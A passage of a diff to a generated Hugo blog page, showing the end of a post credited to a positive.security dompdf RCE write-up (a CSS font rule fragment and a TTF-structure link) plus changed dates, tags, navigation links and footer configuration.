+</span></span><span class="line"><span class="cl"> <span class="nx">font</span><span class="o">-</span><span class="nx">weight</span><span class="o">:</span><span class="s1">&#39;normal&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="nx">font</span><span class="o">-</span><span class="nx">style</span><span class="o">:</span><span class="s1">&#39;normal&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ttf结构网上搜就有了</p>
+<p>ttf文件结构
+<a href="https://juejin.cn/post/7010064099027451912" target="_blank" rel="noopener noreferrer">https://juejin.cn/post/7010064099027451912</a>
+原文地址：https://positive.security/blog/dompdf-rce</p></div>
 
         <div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2024-02-06</span>
+                <span>Updated on 2023-09-13</span>
             </div>
             <div class="post-info-license"></div>
         </div>
@@ -120,20 +463,20 @@
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%A4%8D%E7%8E%B0/">复现</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/php-parameter/" class="prev" rel="prev" title="Php Parameter"><i class="fas fa-angle-left fa-fw"></i>Php Parameter</a>
-            <a href="/posts/sictf/" class="next" rel="next" title="SICTF">SICTF<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/posts/sictf/" class="prev" rel="prev" title="SICTFround2 wp"><i class="fas fa-angle-left fa-fw"></i>SICTFround2 wp</a>
+            <a href="/posts/lolita-n1/" class="next" rel="next" title="udf导出表">udf导出表<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
-</article></div>
+<div id="comments"></div></article></div>
         </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
                     Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
             <div class="footer-line"></div>
             <div class="footer-line">
             </div>
@@ -144,7 +487,7 @@
         </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
             <i class="fas fa-comment fa-fw"></i>
         </a>
-    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"desktop-header-typeit":"DELETE's blog","mobile-header-typeit":"DELETE's blog"},"typeit":{"cursorChar":null,"cursorSpeed":null,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":null,"speed":null}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
 </body>
 
 </html>
